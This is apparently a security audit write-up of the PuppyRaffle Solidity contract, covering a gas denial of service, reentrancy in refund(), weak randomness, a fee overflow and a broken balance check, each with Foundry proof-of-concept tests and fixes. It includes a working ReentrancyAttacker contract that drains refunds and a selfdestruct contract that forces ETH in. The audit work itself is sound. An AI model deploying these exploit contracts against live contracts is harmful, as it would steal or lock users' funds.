### [M-#] Looping through players array to check for duplicates in `PuppleRaffle::enterRaffle` is a potential denial of service (DOS) attack, incrementing gas costs for future entrants

**Description:**  The `PurpleRaffle::enterRaffle` function loops through `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramaticaally lower than those who enter later. Every additional player is an additional check the loop will have to make.

```javascript
          // audit Denial of Service (DoS)
    @>    for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }        
```

**Impact:** The gas costs for raffle entrants will increase greatly as more players enter the raffle. There will be a rush at the start of a raffle for players to be first in the queue. An attacker might make array so big that noone else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have two sets of 100 players enter the raffle, the gas costs will be as such:
- 1st 100 players = ~6523172 gas
- 2nd 100 players = ~18995512 gas

This is 3x more expensive for the second players

<details>
<summary>PoC</summary>
Place the following test into `PuppleRaffleTest.t.sol`

```javascript
    function testDenialOfServicerRiskWithManyPlayers() public {
        // gas price set to 1 gwei for easier calculation
        vm.txGasPrice(1);
        // create a large batch of players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(uint160(i + 1));
        }
        // measure gas usage
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas used to enter raffle with 100 players:", gasUsedFirst);

        // second batch

        address[] memory players2 = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players2[i] = address(uint160(i + 101));
        }
        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players2);
        uint256 gasEnd2 = gasleft();

        uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;

        console.log("Gas used to enter raffle with 100 players again:", gasUsedSecond);

        assert(gasUsedSecond > gasUsedFirst);
    }
```

</details>


**Recommended Mitigation:**  There are a few recommendations

1. Consider allowing duplicates. Users can make new wallets addresses anyways, so a duplicate doesnt prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }    
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```
Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

### [H-1] Reentrancy Vulnerability in refund() Function (Improper State Update Order + External Call Before State Change)

**Description:** The refund() function in the PuppyRaffle contract performs an external call to payable(msg.sender).sendValue(entranceFee) before updating the contract’s internal state (players[playerIndex] = address(0)).
This allows a malicious player to exploit reentrancy by triggering the refund() function multiple times through a fallback or receive() function, draining multiple refunds before the player’s entry is cleared from the players array.

```javascript
        function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
        
        //audit reentrancy attack, the contracts sends eth before removing the player, add nonreentranct from openzeppelin
@>      payable(msg.sender).sendValue(entranceFee);

@>      players[playerIndex] = address(0);
        //audit-low evnt can be manipulated
        emit RaffleRefunded(playerAddress);
    }
```

**Impact:**  A malicious user could repeatedly trigger the refund process to receive multiple refunds for a single entry, leading to a loss of contract funds and denial of service for other legitimate players.

**Proof of Concept:**

- Attacker joins the raffle as a player.
- The attacker deploys a malicious contract with a fallback/receive function that calls refund() again upon receiving Ether.
- When the attacker calls refund(), the external call to sendValue() triggers the fallback and recursively calls refund() before the players[playerIndex] value is set to address(0).
- The attacker can drain the raffle funds through repeated refunds.

Add the following to `PuppleRaffleTest.t.sol` test file

<details>
<summary>Code</summary>

```javascript
function testReentrancyAttackRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker reentrancyAttacker = new ReentrancyAttacker(puppyRaffle);
        address attackerUser = makeAddr("attackerUser");
        vm.deal(attackerUser, 1 ether);

        uint256 startingAttackContractBalance = address(reentrancyAttacker).balance;
        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

        vm.prank(attackerUser);
        reentrancyAttacker.attack{value: entranceFee}();

        console2.log("starting attacker contract balance:", startingAttackContractBalance);
        console2.log("starting pupple raffle contract balance:", startingPuppyRaffleBalance);

        console2.log("ending attacker contract balance:", address(reentrancyAttacker).balance);
        console2.log("ending puppy raffle contract balance:", address(puppyRaffle).balance);
    }

}

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 indexOfAttacker;

    constructor(PuppyRaffle _puppleRaffle) {
        puppyRaffle = _puppleRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        indexOfAttacker = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(indexOfAttacker);
    }
    
    function _stealMoney() internal {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(indexOfAttacker);
        }
    }
    fallback() external payable {
        _stealMoney();
    }
    receive() external payable {
        _stealMoney();
    }
}
```

</details>

**Recommended Mitigation:** 

- Update the contract’s state before performing external calls. Additionally, we move event emission up as well.

```diff
        function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

- Apply the nonReentrant modifier from OpenZeppelin’s ReentrancyGuard to prevent nested calls.

```diff
+ import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
```

### [H-2] Weak Randomness in Winner Selection (Predictable Outcome via Block Variables)

**Description:** The contract determines the raffle winner using the following line:
```javascript
uint256 winnerIndex =
    uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```
This approach relies on block variables (block.timestamp and block.difficulty) and user-controlled input (msg.sender) to generate randomness.
These values are predictable or manipulable by miners and users, meaning the resulting random number can be influenced or even predicted off-chain.
An attacker could repeatedly call the function or front-run transactions until a favorable outcome is produced (e.g., ensuring they win the raffle).

**Impact:**  An attacker can manipulate the winner selection process, resulting in an unfair raffle where they consistently win or significantly increase their chances of winning. This undermines the contract’s integrity and fairness, potentially leading to loss of trust or financial losses for legitimate players.

**Proof of Concept:**
- The attacker monitors the blockchain for when the raffle is about to be closed.
- They simulate the keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty)) computation off-chain using possible timestamp and difficulty values.
- The attacker submits their transaction when the predicted output of the hash gives a favorable modulo result — ensuring they become the selected winner.
Because msg.sender is included in the hash, the attacker can easily tweak their address (by using a new contract address or a CREATE2 deployment) to brute-force a winning outcome.

**Recommended Mitigation:**  Use a verifiable source of randomness, such as Chainlink VRF (Verifiable Random Function) or another commit-reveal mechanism.

### [M-#] Integer Overflow in Fee Accumulation (Incorrect Accounting + Potential Fund Loss)

**Description:** The contract accumulates collected fees using a fixed-width `uint64` in the following statement:
```javascript
totalFees = totalFees + uint64(fee);
```
This introduces a classic integer overflow vulnerability. When `totalFees` grows large enough that adding another fee pushes it past the maximum value storable in a 64-bit unsigned integer (2^64 - 1), it will wrap around to zero instead of reverting. As a result, the contract’s internal accounting will report a drastically smaller totalFees even though additional fees were successfully collected.

This overflow causes incorrect fee tracking and may prevent legitimate withdrawal of accumulated funds. Attackers or even normal users can trigger this state simply by participating in multiple raffles over time.

**Impact:** 
- Financial loss or misaccounting: Accumulated fees become smaller than the actual value collected.
- Permanent loss of withdrawable funds: The wrapped-around value may cause withdrawal logic to fail or lock up the contract.
- Integrity risk: The contract’s accounting becomes unreliable and may break fee distribution or refund logic.

**Proof of Concept:**
A simplified Forge test demonstrates the overflow effect:

<details>
<summary>PoC</summary>
Place the following test into `PuppleRaffleTest.t.sol`

```javascript
    function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console2.log("ending total fees", endingTotalFees);
        console2.log("starting total fees", startingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

</details>

**Recommended Mitigation:** 
- Use newer versions of solidity, >0.8.0
- Use a bigger uint type

### [S-#] Mishandling of ETH During Fee Withdrawal (Logic Flaw + Denial of Service)

**Description:** The `PuppleRaffle::withdrawFees` function includes a fragile balance check that directly compares the contract’s ETH balance with the recorded `totalFees` value:
```javascript
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```
This introduces a mishandling of ETH risk because the contract assumes its balance will always equal the tracked `totalFees`.
However, this assumption can easily be broken if the contract receives Ether outside normal flows, for example, through a self-destruct from another contract or direct transfers without calling enterRaffle().
Once the balance mismatch occurs, legitimate withdrawals will revert, permanently locking all funds in the contract.

**Impact:** 
- Permanent loss of access to legitimate fees due to reverted withdrawals.
- Attackers or users can grief the protocol by forcing extra ETH into the contract, causing a Denial of Service (DoS) on fee withdrawal.
- The mismatch also breaks accounting integrity, as totalFees no longer accurately reflects the real contract balance.

**Proof of Concept:**

<details>
<summary>PoC</summary>
Place the following test into `PuppleRaffleTest.t.sol`

```javascript
    function testMishandlingFeesInWithrawFees() public playersEntered {
        // finish the raffle to allow fees withdrawal
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        uint256 totalFeesBefore = puppyRaffle.totalFees();
        console.log("contract balance before:", contractBalanceBefore);
        console.log("total fees before:", totalFeesBefore);
        assertEq(contractBalanceBefore, totalFeesBefore);

        Destruct attacker = new Destruct();
        attacker.attack{value: 1 ether}(address(puppyRaffle));
        assertGt(address(puppyRaffle).balance, puppyRaffle.totalFees(), "Destruct cause mismatch in balances");

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

A malicious contract can intentionally send extra ETH to PuppyRaffle without participating in the raffle:

```javascript
contract Destruct {
    function attack(address target) external payable {
        selfdestruct(payable(target));
    }
}

```

After deploying Destruct, the attacker calls:

```javascript
attacker.attack{value: 1 ether}(address(puppyRaffle));
```
This increases address(puppyRaffle).balance without updating totalFees.
Subsequent calls to withdrawFees() will revert with
"PuppyRaffle: There are currently players active!",
effectively locking all legitimate funds in the contract.
</details>

**Recommended Mitigation:** 
- Avoid strict equality checks between address(this).balance and internal accounting variables. The code could be changed to >= instead of ==. Which means that the available ETH balance should be _at least_ `totalDeposits`, which makes more sense.
```diff
+ equire(address(this).balance >= uint256(totalFees), "PuppyRaffle: There are currently players active!");
```
- Remove or loosen the condition to allow withdrawals as long as there are no active players, rather than matching balances.

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

```diff
+ require(players.length == 0, "PuppyRaffle: There are currently players active!");
```
- implement a receive() function that rejects unsolicited ETH to maintain accounting integrity:
```diff
+ receive() external payable {
+    revert("Direct ETH transfers not allowed");
}

```




